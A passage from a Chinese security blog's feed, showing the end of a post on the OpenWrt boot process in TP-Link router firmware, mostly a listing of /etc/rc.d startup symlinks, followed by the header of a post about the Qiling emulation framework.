class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的作用差不多是添加&#x2F;etc&#x2F;rc.d&#x2F;*下的脚本作为task并执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">~/fr/t/_TL-WAR2/squashfs-root/etc ------------------------------------------------------------------------------------------------------------------</span><br><span class="line">&gt; ls -all ./rc.d    </span><br><span class="line">总用量 <span class="number">8</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">39</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">12</span>月 <span class="number">25</span> <span class="number">15</span>:<span class="number">44</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K20miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K26pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K80uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K81apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K90wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K98boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99umount -&gt; ../init.d/umount</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S00sysfixtime -&gt; ../init.d/sysfixtime</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S01led_early -&gt; ../init.d/led_early</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S10boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S10system -&gt; ../init.d/system</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S14tddpd -&gt; ../init.d/tddpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S15loggerd -&gt; ../init.d/loggerd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S15rsa_check -&gt; ../init.d/rsa_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S20network -&gt; ../init.d/network</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S21switch -&gt; ../init.d/<span class="keyword">switch</span></span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S25sysctl -&gt; ../init.d/sysctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S26time_setting -&gt; ../init.d/time_setting</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S31tmngtd -&gt; ../init.d/tmngtd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S40fstab -&gt; ../init.d/fstab</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S40watchdog -&gt; ../init.d/watchdog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S42ipgroup -&gt; ../init.d/ipgroup</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S42ippool -&gt; ../init.d/ippool</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S45firewall -&gt; ../init.d/firewall</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S46nat -&gt; ../init.d/nat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47access_ctl -&gt; ../init.d/access_ctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47administration -&gt; ../init.d/administration</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47dos_defense -&gt; ../init.d/dos_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47flood_defense -&gt; ../init.d/flood_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47imb -&gt; ../init.d/imb</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47mac_filter -&gt; ../init.d/mac_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50cron -&gt; ../init.d/cron</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50pure-ftpd -&gt; ../init.d/pure-ftpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50queueventd -&gt; ../init.d/queueventd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50telnet -&gt; ../init.d/telnet</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S52qos-tplink -&gt; ../init.d/qos-tplink</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60collectd -&gt; ../init.d/collectd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60dnsmasq -&gt; ../init.d/dnsmasq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60pptpd -&gt; ../init.d/pptpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60url_filter -&gt; ../init.d/url_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60xl2tpd -&gt; ../init.d/xl2tpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S62vpn_wan -&gt; ../init.d/vpn_wan</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S65wifidog -&gt; ../init.d/wifidog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S69ipstat -&gt; ../init.d/ipstat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S69online -&gt; ../init.d/online</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70freeStrategy -&gt; ../init.d/freeStrategy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70init_iface -&gt; ../init.d/init_iface</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-drv -&gt; ../init.d/qca-nss-drv</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-ecm -&gt; ../init.d/qca-nss-ecm</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S72shortcut-fe -&gt; ../init.d/shortcut-fe</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S76session_limits -&gt; ../init.d/session_limits</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S80websort -&gt; ../init.d/websort</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S83web_security -&gt; ../init.d/web_security</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S85webfilter -&gt; ../init.d/webfilter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S89remote_mngt -&gt; ../init.d/remote_mngt</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S90dnsproxy -&gt; ../init.d/dnsproxy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93appdist -&gt; ../init.d/appdist</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93bwlist_qq -&gt; ../init.d/bwlist_qq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93done -&gt; ../init.d/done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93l2tp -&gt; ../init.d/l2tp</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93mwan3 -&gt; ../init.d/mwan3</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">25</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94default_balance -&gt; ../init.d/default_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94isp_route -&gt; ../init.d/isp_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94load_balance -&gt; ../init.d/load_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94policy_route -&gt; ../init.d/policy_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94static_route -&gt; ../init.d/static_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94sysntpd -&gt; ../init.d/sysntpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S95ipsec -&gt; ../init.d/ipsec</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S96cloud_sdk -&gt; ../init.d/cloud_sdk</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97cloud_client -&gt; ../init.d/cloud_client</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97cmxddns -&gt; ../init.d/cmxddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97dev_discover -&gt; ../init.d/dev_discover</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97dyn3322ddns -&gt; ../init.d/dyn3322ddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97phddns -&gt; ../init.d/phddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97storage_share -&gt; ../init.d/storage_share</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97sys_monitor -&gt; ../init.d/sys_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97system_params -&gt; ../init.d/system_params</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97tpddnsd -&gt; ../init.d/tpddnsd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97uhttpd -&gt; ../init.d/uhttpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98led -&gt; ../init.d/led</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98zero_boot_done -&gt; ../init.d/zero_boot_done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">27</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99commit_sysupgrade -&gt; ../init.d/commit_sysupgrade</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99devmngr -&gt; ../init.d/devmngr</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99powerctl -&gt; ../init.d/powerctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99thermal -&gt; ../init.d/thermal</span><br></pre></td></tr></table></figure><p>即执行&#x2F;etc&#x2F;init.d&#x2F;下的所有服务</p><p><strong>至此启动流程分析完毕</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;openwrt路由器启动流程&quot;&gt;&lt;a href=&quot;#openwrt路由器启动流程&quot; class=&quot;headerlink&quot; title=&quot;openwrt路由器启动流程&quot;&gt;&lt;/a&gt;openwrt路由器启动流程&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="openwrt" scheme="http://s1nec-1o.github.io/tags/openwrt/"/>
    
  </entry>
  
  <entry>
    <title>初探Qiling framework</title>
    <link href="http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/"/>
    <id>http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/</id>
    <published>2024-11-23T07:04:30.000Z</published>
    <updated>2024-11-23T07:10:17.437Z</updated>
    
